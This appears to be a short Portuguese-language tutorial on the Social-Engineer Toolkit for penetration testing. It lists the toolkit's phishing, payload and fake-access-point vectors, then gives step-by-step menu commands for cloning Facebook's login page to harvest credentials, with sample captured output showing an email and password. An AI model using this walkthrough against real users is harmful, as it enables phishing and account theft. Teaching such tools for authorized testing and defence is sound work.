### Social-Engineer Toolkit (SET)
É uma ferramenta abrangente para realizar testes de penetração focados em engenharia social. Ele oferece uma variedade de vetores de ataque, incluindo:

<ol>
<li><b>Spear-Phishing Attack Vectors:</b> Criação de e-mails de phishing direcionados.</li>
<li><b>Website Attack Vectors:</b> Clonagem de sites para capturar credenciais.</li>
<li><b>Infectious Media Generator:</b> Criação de mídias infectadas para distribuição.</li>
<li><b>Create a Payload and Listener:</b> Geração de payloads e configuração de listeners.</li>
<li><b>Mass Mailer Attack:</b> Envio de e-mails em massa para campanhas de phishing.</li>
<li><b>Arduino-Based Attack Vector:</b> Uso de dispositivos Arduino para ataques.</li>
<li><b>Wireless Access Point Attack Vector:</b> Criação de pontos de acesso falsos.</li>
<li><b>QRCode Generator Attack Vector:</b> Geração de QR codes maliciosos.</li>
<li><b>Powershell Attack Vectors:</b> Uso de scripts PowerShell para ataques.</li>
<li><b>Third Party Modules:</b> Integração com módulos de terceiros.</li>
</ol>

## Simulação de Comandos no Linux com SET

```bash
# Obter privilégios de superusuário
sudo su

# Iniciar o Social-Engineer Toolkit
setoolkit

# Selecionar Social-Engineering Attacks
1) Social-Engineering Attacks

# Selecionar Website Attack Vectors
2) Website Attack Vectors

# Selecionar Credential Harvester Attack Method
3) Credential Harvester Attack Method

# Selecionar Site Cloner
2) Site Cloner

# Inserir o URL para clonar
http://www.facebook.com

```

Com isso, O SET então criará uma cópia do site para usar em ataques de coleta de credenciais.

```
POSSIBLE USERNAME FIELD FOUND: skip_api_login=
PARAM: signed_next=
PARAM: trynum=1
PARAM: timezone=180
PARAM: lgndim=eyJ0eXBlIjoiY2xpZW50IiwiY29udGVudF9pZCI6IjMwMDY0NzY
PARAM: lgnjs=1668021982
POSSIBLE USERNAME FIELD FOUND: email=joao@gmail.com
POSSIBLE PASSWORD FIELD FOUND: pass=passwd123654
PARAM: prefill_contact_point=
PARAM: prefill_source=
PARAM: prefill_type=
PARAM: first_prefill_source=
```
